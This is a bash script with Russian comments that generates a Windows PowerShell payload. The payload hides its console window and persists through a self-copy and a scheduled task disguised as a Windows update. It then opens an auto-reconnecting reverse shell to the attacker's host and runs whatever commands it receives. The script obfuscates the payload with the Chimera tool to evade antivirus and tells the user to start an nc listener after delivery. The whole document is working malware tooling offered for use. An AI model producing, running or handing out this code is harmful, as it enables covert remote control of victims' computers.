#!/bin/bash

LHOST=$(ip addr show wlan0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1 || ip addr show eth0 | grep -oP '(?<=inet\s)\d+(\.\d+){3}' | head -n 1)

echo "[+] Твой локальный IP: $LHOST"
echo "[?] Введите порт для Reverse Shell (напр. 4444):"
read LPORT

# 2. Создаем временный ps1 файл с простым Reverse Shell
# Это классический однострочник, который Chimera потом "размажет"
RAW_FILE="raw_shell.ps1"
cat <<EOF > $RAW_FILE
# 1. STEALTH: Немедленно прячем окно
\$code = @'
    [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
    [DllImport("kernel32.dll")] public static extern IntPtr GetConsoleWindow();
'@
\$type = Add-Type -MemberDefinition \$code -Name "Win32Utils" -Namespace "Util" -PassThru
\$type::ShowWindow(\$type::GetConsoleWindow(), 0)

# 2. PERSISTENCE: Самокопирование и создание задачи
\$path = "\$env:APPDATA\Microsoft\Windows\win_update.ps1"
if (! (Test-Path \$path)) {
    # Скрипт копирует содержимое текущего запущенного процесса в файл
    Get-Content \$MyInvocation.MyCommand.Definition | Set-Content \$path
    
    \$taskName = "WindowsUpdateAutoCheck"
    \$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoP -W Hidden -Exec Bypass -File \"\$path\""
    \$trigger = New-ScheduledTaskTrigger -AtLogOn
    
    # Регистрация задачи (без прав админа работает для текущего пользователя)
    Register-ScheduledTask -Action \$action -Trigger \$trigger -TaskName \$taskName -Description "Microsoft Update" -Force
}

# 3. CORE: Рекурсивный Reverse Shell (авто-реконнект)
while(\$true) {
    try {
        \$c = New-Object System.Net.Sockets.TCPClient('$LHOST',$LPORT)
        \$s = \$c.GetStream()
        \$b = New-Object Byte[] 65536
        
        while((\$i = \$s.Read(\$b, 0, \$b.Length)) -ne 0) {
            \$d = (New-Object Text.ASCIIEncoding).GetString(\$b, 0, \$i)
            # Выполнение команд через iex
            \$out = (iex \$d 2>&1 | Out-String)
            \$p = "PS " + (pwd).Path + "> "
            \$res = ([Text.Encoding]::ASCII).GetBytes(\$out + \$p)
            \$s.Write(\$res, 0, \$res.Length)
        }
    } catch { 
        # Если связи нет, ждем 30 секунд и пробуем снова
        Start-Sleep -Seconds 30 
    }
}
EOF


echo "[*] Файл $RAW_FILE создан."

OUTPUT_FILE="crypt_shell.ps1"

echo "[*] Запуск Chimera (Level: Insane)..."
bash chimera.sh --file $RAW_FILE --all --level 5 --prepend --output $OUTPUT_FILE

if [ $? -eq 0 ]; then
    echo "========================================"
    echo "[+] ГОТОВО! Пейлоад: $OUTPUT_FILE"
    echl "ты можешь запустить nc -lvp [твой порт] после доставки и исполнения"
    echo "========================================"
    rm $RAW_FILE
else
    echo "[-] Ошибка при работе Chimera. Проверь путь к бинарнику."
fi
